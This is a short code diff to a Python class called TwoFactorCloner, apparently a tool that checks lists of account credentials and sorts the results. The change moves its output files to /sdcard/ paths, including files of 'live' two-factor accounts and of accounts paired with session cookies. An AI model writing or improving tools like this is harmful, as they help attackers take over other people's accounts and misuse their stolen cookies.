@@ -64,7 +64,7 @@ class TwoFactorCloner:
                 self.divider()
                 print(f"{self.YELLOW}[WRONG FORMAT] " + element)
                 self.divider()
-                with open("wrong_format.txt", 'a') as f:
+                with open("/sdcard/wrong_format.txt", 'a') as f:
                     f.write(element + '\n')
                 continue
 
@@ -73,19 +73,19 @@ class TwoFactorCloner:
                 datax = data.replace("[2F] ", "")
                 print(f"{self.GREEN}[2F] {datax}")
                 self.ok += 1
-                with open("2f_live.txt", 'a') as f:
+                with open("/sdcard/2f_live.txt", 'a') as f:
                     f.write(element + '\n')
-                with open("2f_live_with_cookies.txt", "a") as f:
+                with open("/sdcard/2f_live_with_cookies.txt", "a") as f:
                     f.write(f"{datax}|{cookie}\n")
             elif 'Cookies lol' in data:
                 print(f"{self.RED}[FL] {data}")
                 self.fail += 1
-                with open("2f_failed.txt", 'a') as f:
+                with open("/sdcard/2f_failed.txt", 'a') as f:
                     f.write(element + '\n')
             elif 'wrong password' in data:
                 print(f"{self.WHITE}[WR] {data}")
                 self.fail += 1
-                with open("wrong_pass.txt", 'a') as f:
+                with open("/sdcard/wrong_pass.txt", 'a') as f:
                     f.write(element + '\n')
             else:
                 exit("Error" + data)
